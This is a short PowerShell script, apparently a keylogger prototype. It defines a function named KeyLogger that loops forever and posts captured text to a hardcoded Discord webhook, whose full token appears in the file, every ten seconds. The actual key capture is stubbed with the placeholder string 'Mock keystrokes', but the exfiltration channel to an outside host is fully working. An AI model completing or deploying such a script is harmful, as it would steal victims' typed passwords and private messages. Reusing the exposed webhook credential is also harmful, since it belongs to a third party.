
$discordWebhookUrl = "https://discord.com/api/webhooks/1243928007182385182/SCzOW4wzwv6jNNPR45QctapEh1kTGVKqSDBrxn7gAR0J4K-pXfbE1IIbW9VrsfVXL6T6"


function Send-DiscordMessage {
    param (
        [string]$Content
    )

    try {
        $body = @{
            content = $Content
        } | ConvertTo-Json

        Invoke-WebRequest -Uri $discordWebhookUrl -Method Post -ContentType "application/json" -Body $body
    }
    catch {
        Write-Host "Error occurred: $_"
    }
}


function KeyLogger {
    while ($true) {
        Start-Sleep -Seconds 10  

        
        $keystrokes = "Mock keystrokes"

        
        Send-DiscordMessage -Content $keystrokes
    }
}


KeyLogger
